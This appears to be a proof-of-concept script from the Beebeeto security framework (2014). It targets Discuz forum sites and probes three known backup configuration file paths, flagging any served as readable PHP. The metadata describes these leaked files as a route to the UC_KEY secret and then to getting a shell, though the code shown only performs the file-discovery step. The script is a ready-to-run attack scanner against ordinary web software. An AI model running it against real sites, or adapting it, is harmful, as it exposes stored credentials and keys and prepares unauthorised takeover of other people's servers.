#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0053',  # 由Beebeeto官方编辑
            'name': 'Discuz 敏感文件备份导致uc_key泄露GETSHELL POC',  # 名称
            'author': '我只会打连连看',  # 作者
            'create_date': '2014-10-05',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议所使用的第三层协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',  # 漏洞所涉及的应用名称
            'vul_version': ['*'],  # 受漏洞影响的应用版本
            'type': 'Information Disclosure',  # 漏洞类型
            'tag': ['Discuz备份泄露', '信息泄露', 'GETSHELL'],  # 漏洞相关tag
            'desc': 'Discuz存在一些敏感文件，如果存在备份的话，可能导致UC_KEY的泄露从而进行GETSHELL。',  # 漏洞描述
            'references': ['http://fofa.so/exploits/9',
                           'http://phpinfo.me/2014/01/10/182.html',  # 参考链接
                           ],
        },
    }


    @classmethod
    def verify(cls, args):  # 实现验证模式的主函数
        bak_list =  ['/config/config_global.php.bak','/uc_server/data/config.inc.php.bak','/config/config_ucenter.php.bak']
        args['poc_ret']['bak'] = []
        # for for for
        for bak_url in bak_list:
            verify_url = args['options']['target'] + bak_url
            if args['options']['verbose']:
                print '[*] Request URL: ' + verify_url
            try:
                req = urllib2.urlopen(verify_url)
                content = req.read()
            except:
                continue
            if req.getcode() == 200:
                if '<?php'  in content:
                    args['success'] = True
                    args['poc_ret']['bak'].append(verify_url)
        if not args['poc_ret']['bak']:
            args['poc_ret'].pop('bak')
            args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
